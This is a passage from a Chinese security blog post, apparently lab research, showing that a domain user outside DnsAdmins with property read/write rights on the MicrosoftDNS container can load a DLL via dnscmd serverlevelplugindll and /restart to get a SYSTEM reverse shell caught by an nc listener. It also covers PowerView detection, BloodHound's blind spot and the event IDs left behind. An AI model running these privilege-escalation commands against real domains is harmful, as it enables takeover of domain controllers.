+</span></span></code></pre></div><p>修改完毕后列出，可以看到dns-test用户并没有完全添加通用写入和通用读取，这可能是因为AD 对象类型限制，毕竟MicrosoftDNS本质上属于容器，域环境应该会阻止对其写入通用写入权限（这是我的猜测，其并不准确，我会在后续有时间的时候继续探讨这个问题）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>允许 BICKER<span style="color:#ae81ff">\d</span>ns-test  特殊访问
+</span></span><span style="display:flex;"><span>   READ PERMISSIONS <span style="color:#75715e">#通用读取</span>
+</span></span><span style="display:flex;"><span>   LIST CONTENTS <span style="color:#75715e">#列出内容</span>
+</span></span><span style="display:flex;"><span>   WRITE SELF <span style="color:#75715e">#写入自身</span>
+</span></span><span style="display:flex;"><span>   WRITE PROPERTY <span style="color:#75715e">#属性写入</span>
+</span></span><span style="display:flex;"><span>   READ PROPERTY <span style="color:#75715e">#属性读取</span>
+</span></span><span style="display:flex;"><span>   LIST OBJECT <span style="color:#75715e">#列出对象</span>
+</span></span></code></pre></div><p>当我们登陆这个用户并尝试执行和之前tindalos用户（属于dnsadmin组）通用的加载权限的时候，令我惊讶的事情发生了，这个不在dnsadmin组当中的用户毫无阻碍的将system权限shell弹了回来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\d</span>ns-test&gt; dnscmd.exe /config /serverlevelplugindll C:<span style="color:#ae81ff">\w</span>irteTEMP<span style="color:#ae81ff">\r</span>ev.dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>注册属性 serverlevelplugindll 成功重置。
+</span></span><span style="display:flex;"><span>命令成功完成。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\d</span>ns-test&gt; dnscmd.exe /restart
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>. 已成功完成。
+</span></span><span style="display:flex;"><span>命令成功完成。
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>192.168.174.129<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.174.143<span style="color:#f92672">]</span> <span style="color:#ae81ff">55669</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>°汾 10.0.20348.169<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation¡£±£´̹ԐȨ<span style="color:#f92672">{</span>¡£
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
+</span></span></code></pre></div><p>所以这里我意识到，只要我们对dns容器存在读取写入权限，我们就能利用热重载进行攻击</p>
+<p>于是我又测试了仅仅给dns-test给予属性读写，看他能否操作热重载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>允许 BICKER<span style="color:#ae81ff">\d</span>ns-test  特殊访问
+</span></span><span style="display:flex;"><span>   WRITE PROPERTY <span style="color:#75715e">#属性写入</span>
+</span></span><span style="display:flex;"><span>   READ PROPERTY <span style="color:#75715e">#属性读取</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\w</span>irteTEMP&gt; dnscmd.exe /config /serverlevelplugindll C:<span style="color:#ae81ff">\w</span>irteTEMP<span style="color:#ae81ff">\r</span>ev.dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DNS 服务器未能重置注册属性。
+</span></span><span style="display:flex;"><span>    状态 <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>0x00000005<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>命令失败:  ERROR_ACCESS_DENIED     <span style="color:#ae81ff">5</span>    0x5
+</span></span></code></pre></div><p>失败是正常的，单一的属性读取并不足以dnscmd进行认证</p>
+<p>所以现在可以给出现阶段的研究结论了:</p>
+<p>执行热重载dns劫持并不一定需要成为dnsadmin组，而只需要对MicrosoftDNS容器的通用读取权限以及写入属性权限（<a class="link" href="https://www.semperis.com/blog/dnsadmins-revisited/"  target="_blank" rel="noopener"
+    >Yuval Gordon</a>文章指出需要通用写入以及通用读取，在以上的测试中我发现通用写入并不一定需要且配置起来比较困难，所以读取属性权限就够了），以及对dc的rpc访问权限即可（域用户即可）</p>
+<h2 id="攻击路径检测难度">攻击路径检测难度
+</h2><p>那么这种不再dnsadmin组中却对dns容器存在acl的情况是否容易检测呢？</p>
+<p>通过猎犬，我们可以看到用户没有出站，针对性查找也无法查找，这很正常</p>
+<p><img src="/dnsadmin/image.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>猎犬只抓取</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>用户（User）
+</span></span><span style="display:flex;"><span>组（Group）
+</span></span><span style="display:flex;"><span>计算机（Computer）
+</span></span><span style="display:flex;"><span>OU（组织单位）
+</span></span><span style="display:flex;"><span>域（Domain）
+</span></span><span style="display:flex;"><span>GPO（组策略对象）
+</span></span></code></pre></div><p>而MicrosoftDNS属于system容器，容器(Container)默认是不会被抓取的，因为它不是常规的 OU 或对象类型，正常的hound只扫描标准AD-ACL。</p>
+<p>但是powerview的高危筛选就能清晰的筛选出来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\w</span>irteTEMP&gt;. .<span style="color:#ae81ff">\P</span>owerView.ps1
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\w</span>irteTEMP&gt; Find-InterestingDomainAcl -ResolveGUIDs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ObjectDN                : CN<span style="color:#f92672">=</span>MicrosoftDNS,CN<span style="color:#f92672">=</span>System,DC<span style="color:#f92672">=</span>bicker,DC<span style="color:#f92672">=</span>com
+</span></span><span style="display:flex;"><span>AceQualifier            : AccessAllowed
+</span></span><span style="display:flex;"><span>ActiveDirectoryRights   : Self, WriteProperty, GenericRead
+</span></span><span style="display:flex;"><span>ObjectAceType           : None
+</span></span><span style="display:flex;"><span>AceFlags                : None
+</span></span><span style="display:flex;"><span>AceType                 : AccessAllowed
+</span></span><span style="display:flex;"><span>InheritanceFlags        : None
+</span></span><span style="display:flex;"><span>SecurityIdentifier      : S-1-5-21-298176814-2846777796-698167141-3601
+</span></span><span style="display:flex;"><span>IdentityReferenceName   : dns-test
+</span></span><span style="display:flex;"><span>IdentityReferenceDomain : bicker.com
+</span></span><span style="display:flex;"><span>IdentityReferenceDN     : CN<span style="color:#f92672">=</span>dns-test,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>bicker,DC<span style="color:#f92672">=</span>com
+</span></span><span style="display:flex;"><span>IdentityReferenceClass  : user
+</span></span></code></pre></div><p>所以在这种情况下只能利用利用rast模块本地枚举或者powerview</p>
+<h2 id="restart优点和缺点">/restart优点和缺点
+</h2><p>当我们利用热重载进行攻击过后，查看dns的日志文件，发现仅存在事件</p>
+<p>事件ID770（已加载服务器级插件 DLL）事件ID140，而正常的服务重启会产生7035(服务重启)，7036(服务状态更改)等事件，这些事件无一例外的都会产生大量“噪音”</p>
+<p>为何利用/restart操作会这样呢，其实问题藏在事件ID140报错当中（rpc终结点重复）</p>
+<p>DNS管理面是通过RPC终结点对外提供接口的。一个服务在对外“开门”前，会先注销旧终结点，再注册新终结点，无论是正常重启还是内部重载，代码层面都去调了“注销终结点”的同一个 API，但这个注销动作失败了，可以这么理解</p>
+<ol>
+<li>正常重启：原理是服务进程会退出，重新启动一个新进程，在退出进程前服务注销失败，但进程马上退出。进程一退出，RPC运行时会自动清理它的终结点注册，所以不会留下脏状态；新进程再起来，顺利注册，没有后续错误。</li>
+<li>内部重载（/Restart）:同一个进程里调用内部函数reloadShutdown，把组件“关—再开”，不退出进程。类似“热重载”但是进程并未重启。所以注销失败后，旧的终结点还挂着；接着重载流程又去注册相同的终结点，于是 RPC 端点映射器发现“这玩意儿已经有了”，报 140事件错误</li>
+</ol>
+<p>从这件事件可以看出热重载和服务重启的区别</p>
+<ol>
+<li>
+<p>服务重启会产生大量日志报告，且需要服务重启权限，一般需要域管理或者server2019前存在的默认组服务操作员等权限，或者更彻底一点，直接等待机器重启，但是重启后并不会导致dns管理平台失控，还是正常允许我们撤销dll痕迹清楚</p>
+</li>
+<li>
+<p>热重载“噪音小”且只需要dnsadmin或者容器读写权限即可单独操作，但是会导致140错误，在机器下次重启之前dns管理平台会死机，这个进程将不再允许dns管理控制台的介入，dnscmd也无法进行下一步工作</p>
+</li>
+</ol>
+<h2 id="感谢">感谢
+</h2><p>本拙略冗长的文章就到此结束了，在这次研究中我还是有很多底层或者权限理解并未搞清楚，会在之后继续学习，并分享出来，感谢以下文章以及人员的帮助</p>
+<p><a class="link" href="https://www.semperis.com/blog/dnsadmins-revisited/"  target="_blank" rel="noopener"
+    >Yuval Gordon</a>的文章是我这篇文章的基础</p>
+<p>感谢IPv32 乔.九九.☆.0/24的帮助，这篇文章的由来也是因为他对我的靶机产生了非预期解（笑哭）</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/bicher-%E8%87%AA%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bicker-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">使用普通用户帐户远程利用RBCD</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">血缇之书</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
